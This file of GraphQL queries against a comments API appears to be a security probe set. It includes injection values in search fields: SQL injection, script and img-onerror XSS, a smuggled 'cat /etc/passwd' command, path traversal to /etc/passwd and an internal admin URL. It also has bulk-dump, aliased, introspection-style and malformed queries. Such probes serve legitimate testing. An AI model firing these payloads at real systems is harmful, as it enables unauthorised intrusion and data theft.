query.query:
query comments {
  comments(options: {paginate: {page: 1, limit: 10}}) {
    data {
      id
      name
      email
    }
    meta {
      totalCount
    }
  }
}

query comments {
  comments(options: {search: {q: "mike@example.com' OR 1=1--"}}) {
    data {
      id
      body
    }
  }
}

query comments {
  comments(options: {search: {q: "<script>alert(1);</script>"}}) {
    data {
      id
      email
    }
  }
}

query comments {
  comments(options: {search: {q: "http://internal/api/../admin"}}) {
    data {
      id
      name
    }
  }
}

query comments {
  comments(options: {search: {q: "user-input; cat /etc/passwd;"}}) {
    data {
      id
      body
    }
  }
}

query comments {
  comments(options: {search: {q: "../../../../../../etc/passwd"}}) {
    data {
      id
      body
    }
  }
}

query comments {
  comments(options: {search: {q: "<img src=x onerror=alert(1)>"}}) {
    data {
      id
      name
    }
  }
}

query comments {
  comments(options: {paginate: {page: 1, limit: 1000}}) {
    data {
      email
      body
      id
    }
  }
}

query comments {
  s: comments(options: {paginate: {page: 1, limit: 1000}}) {
    data {
      e: id
      n: name
      d: body
    }
  }
}

query Intro {
  comments {
    queryType {
      name
    }
    mutationType {
      name
    }
    types {
      name
      kind
    }
  }
}

query comments {
  comments(options: {paginate: {page: 1, limit: 10}}) {
    dtata {
      id
    }
    mata
  }
}
